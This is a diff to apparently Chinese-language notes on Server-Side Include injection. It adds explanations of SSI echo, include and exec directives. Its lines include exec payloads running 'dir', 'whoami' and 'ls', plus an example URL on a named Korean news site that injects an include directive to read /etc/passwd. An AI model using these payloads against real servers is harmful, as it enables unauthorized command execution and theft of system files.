@@ -12,6 +12,14 @@ window：
 <!--#exec cmd="dir" -->
 <!--#exec cmd="whoami" -->
 
+<!--#echo var="DATE_LOCAL" -->
+用于显示当前时间；
+<!--#include virtual="/cgi-bin/counter.pl" -->
+用于包含CGI 脚本输出；
+<!--#include virtual="/footer.html" -->
+用于包含文件内容；
+<!--#exec cmd="ls" -->
+
 
 例子： 
 http://hpc.ebn.co.kr/news/n_view.html?keys=<!--#include%20file="/etc/passwd"-->
